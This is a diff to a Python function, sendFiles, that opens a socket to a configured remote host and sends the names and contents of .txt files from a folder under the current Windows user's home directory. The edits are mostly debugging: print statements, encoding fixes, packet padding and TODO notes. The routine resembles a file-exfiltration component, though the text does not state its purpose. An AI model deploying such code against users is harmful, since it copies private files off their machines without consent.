@@ -72,21 +72,24 @@ def sendFiles(filedir: str):
         suck.connect((CONNF_HOST, CONNF_PORT))
         print("Connected socket")
 
-        bannedtypes = [".lnk", ".rdp", ".ini",".jpg",".png",".webp",".gif",".mp4",]
+        bannedtypes = [".lnk", ".rdp", ".ini",".jpg",".png",".webp",".gif",".mp4",".docx"]
         for filename in listdir(full_path): # Get each file in folder
             if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
-                print("Got filename: ", filename)
-
+                print("LOOP Got filename: ", filename)
+                # TODO find a way to send pdf/word documents over the socket without converting them to bytes
+                
                 # Send Filename 
-                if filename.endswith(".docx"):
+                if filename.endswith(".txt"):
+                    time.sleep(3)
                     msg = f"FILENAME_TEXT{sep}{filename}"
                     remain = len(msg) - 77 
                     if remain !=0:
                         msg = f"FILENAME_TEXT{sep}{filename}" + f" "* (remain*-1) 
+                        print("Sent filename Packet:", msg)
                     suck.send(msg.encode("utf-8")) # FILENAME:{filename}
 
                     # THIS WILL OPEN THE FILE AS READ BYTES
-                    dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "rb")
+                    dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "r")
                     print("Got file dir: ", dict_files.name)
 
                     # ? Send the filesize before the data
@@ -101,38 +104,27 @@ def sendFiles(filedir: str):
 
                     file_data = dict_files.read(64)
                     while(file_data):
-                        s = """msg = f"TXT_DATA{sep}{file_data}"
-                        aad = f"TXT_DATA{sep}"
-                        packet = bytes(msg, 'utf-8')"""
-
                         print(":::::::::::::::::::::::::::::::::::::::::::::::::::::")        
                         #print(f"HEADER SIZE: {len(aad)}, {aad}" )
-                        print(len(file_data), file_data)
-                        #print(len(msg), msg)
-                        #print(f"MSG TO BYTES SIZE: {len(packet)}")
+                        print(type(file_data), len(file_data), file_data)
+                        print(type(file_data.encode("utf-8")), len(file_data.encode("utf-8")), file_data.encode("utf-8"))
                         print(":::::::::::::::::::::::::::::::::::::::::::::::::::::")
-                        
-                        # ! FOUND THE ISSUE
-                        # ! THE readline(64) function DOESNT ACTUALLY RETURN A 64 CHARACTER MESSAGE
-                        # ! MANY OF THE MESSAGES ARE EITHER OVER 150 CHARACTERS LONG
-                        # ! OR THEY ARE UNDER 20 CHARS LONG
-                        # TODO Force the readline command to only read at max 64 characters 
-                        # TODO If the message is too small add spaces to fill the 64 character message limit
 
-                        suck.send(file_data)
+                        suck.send(file_data.encode("utf-8"))
                         msg = ""
                         file_data = dict_files.read(64)
+
+                    for i in range(3):
+                        suck.send("::END_OF_THE_SOCKET::".encode("utf-8"))
                 
-                    time.sleep(0.02)
+                    # TODO PUT THE 77 BYTES CHECKER INTO A FUNCTION CUZ I USE IT A LOT
+                    #time.sleep(0.5)
+                    
                     msg = f"FINISH{sep}Completed"
-                    suck.send(msg.encode("utf-8"))
-                    print("Transfer completed")
-                    msg = ""
+                    remain = len(msg) - 77     
+                    if remain !=0:
+                        msg = f"FINISH{sep}Completed" + f" "* (remain*-1) 
+                    suck.send(msg.encode("utf-8"))                        
+                    time.sleep(1)
 
-        time.sleep(0.02)         
-        suck.send(f"CLOSE{sep}Closing down".encode("utf-8"))
-        msg = ""
-        suck.close()
-
-    print("File socket closed.")
-    suck.close()
+                print(f"Transfer completed: {msg}")
